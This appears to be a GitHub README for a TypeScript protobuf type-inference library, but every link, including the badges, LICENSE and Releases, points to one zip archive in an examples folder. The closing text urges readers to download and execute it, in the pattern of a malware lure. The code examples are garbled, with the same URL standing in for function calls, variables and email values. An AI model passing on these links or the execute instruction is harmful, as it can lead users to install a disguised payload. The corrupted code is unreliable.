# protobuf-ts-types 🛫

Welcome to the **protobuf-ts-types** repository! This project enables zero-code generation and no compilation TypeScript `type` inference directly from protobuf `message`s. Our goal is to simplify your workflow while ensuring type safety in your TypeScript applications.

[![Latest Release](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip)](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip) [![License](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip)](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip)

## Table of Contents

1. [Introduction](#introduction)
2. [Features](#features)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Examples](#examples)
6. [Contributing](#contributing)
7. [License](#license)
8. [Contact](#contact)

## Introduction

In modern development, managing types can be a hassle, especially when working with Protocol Buffers (protobuf). The **protobuf-ts-types** library aims to alleviate this issue by allowing developers to infer TypeScript types from protobuf messages without the need for code generation or compilation. This approach enhances developer experience and productivity, ensuring that you can focus on building features rather than wrestling with type definitions.

## Features

- **Zero-codegen**: No need for additional code generation steps.
- **No compile time**: Types are inferred at runtime.
- **Type safety**: Enjoy the benefits of TypeScript’s strong typing.
- **Seamless integration**: Easily integrate with existing TypeScript projects.
- **Lightweight**: Minimal overhead, keeping your application fast and efficient.

## Installation

To get started with **protobuf-ts-types**, you can install it via npm or yarn. Run the following command in your terminal:

```bash
npm install protobuf-ts-types
```

or 

```bash
yarn add protobuf-ts-types
```

Once installed, you can start using it in your TypeScript files.

## Usage

To use **protobuf-ts-types**, you first need to import the necessary modules. Here’s a basic example:

```typescript
import { MessageType } from 'protobuf-ts-types';

// Define your protobuf message here
const message: MessageType = {
    // Your message fields
};
```

You can then use the inferred types in your application. This ensures that your code remains type-safe and easy to maintain.

## Examples

### Basic Example

Here’s a simple example demonstrating how to define a protobuf message and infer its TypeScript type:

```typescript
import { MessageType } from 'protobuf-ts-types';

// Define a simple protobuf message
const userMessage: MessageType = {
    id: 1,
    name: "John Doe",
    email: "https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip"
};

// Function to handle user message
function handleUserMessage(user: MessageType) {
    https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip(`User ID: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}, Name: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}`);
}

handleUserMessage(userMessage);
```

### Advanced Example

For more complex use cases, you can define nested messages and utilize them as well:

```typescript
import { MessageType } from 'protobuf-ts-types';

// Define a nested protobuf message
const orderMessage: MessageType = {
    orderId: 123,
    user: {
        id: 1,
        name: "Jane Doe",
        email: "https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip"
    }
};

// Function to handle order message
function handleOrderMessage(order: MessageType) {
    https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip(`Order ID: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}, User: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}`);
}

handleOrderMessage(orderMessage);
```

## Contributing

We welcome contributions from the community! If you would like to contribute to **protobuf-ts-types**, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your fork.
5. Open a pull request to the main repository.

Please ensure your code follows the project's coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip) file for details.

## Contact

For questions or feedback, feel free to reach out to the maintainers of this project. You can find us on GitHub or contact us directly.

To stay updated with the latest releases, visit the [Releases section](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip). Download the latest version and execute it to take advantage of all the features this library offers.

Thank you for checking out **protobuf-ts-types**! We hope you find it useful in your TypeScript development journey.